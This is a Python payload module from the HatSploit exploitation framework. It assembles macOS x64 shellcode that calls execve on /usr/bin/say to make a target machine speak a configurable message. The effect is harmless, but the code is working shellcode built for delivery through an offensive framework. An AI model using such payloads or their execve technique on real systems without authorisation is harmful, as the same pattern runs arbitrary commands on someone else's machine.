"""
This payload requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

import struct
from pex.assembler import Assembler

from hatsploit.lib.payload import Payload


class HatSploitPayload(Payload, Assembler):
    details = {
        'Name': "macOS x64 Say",
        'Payload': "macos/x64/say",
        'Authors': [
            'Ivan Nikolsky (enty8080) - payload developer',
        ],
        'Description': "Say payload for macOS x64.",
        'Architecture': "x64",
        'Platform': "macos",
        'Rank': "low",
        'Type': "one_side",
    }

    options = {
        'MESSAGE': {
            'Description': "Message to say.",
            'Value': "Hello, Friend!",
            'Type': None,
            'Required': True,
        }
    }

    def run(self):
        message = self.parse_options(self.options)

        data = (
                b'\xe8'
                + struct.pack("<I", len(message.encode() + b'\x00') + 0xD)
                + b'/usr/bin/say\x00'
                + message.encode()
                + b'\x00'
        )

        return (
                self.assemble(
                    self.details['Architecture'],
                    """
                start:
                    xor rax, rax
                    mov eax, 0x200003b
                """,
                )
                + data
                + self.assemble(
            self.details['Architecture'],
            """
        end:
            mov rdi, [rsp]
            lea r10, [rdi+0xd]
            xor rdx, rdx
            push rdx
            push r10
            push rdi
            mov rsi, rsp
            syscall
        """,
        )
        )
